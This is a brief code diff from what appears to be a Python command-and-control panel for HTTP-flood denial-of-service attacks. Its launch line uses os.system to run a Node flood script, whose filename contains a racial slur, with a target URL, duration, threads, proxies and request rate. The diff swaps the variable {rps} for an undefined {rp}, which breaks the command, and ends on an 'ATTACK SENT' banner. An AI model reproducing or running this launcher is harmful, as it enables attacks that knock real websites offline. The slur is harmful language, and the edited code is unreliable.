@@ -638,8 +638,7 @@ def main():
                 thread = cnc.split()[3]
                 proxy = cnc.split()[4]
                 rps = cnc.split()[5]
-                os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rps}')
-				os.system ("clear")
+                os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rp}')
 				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
 \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
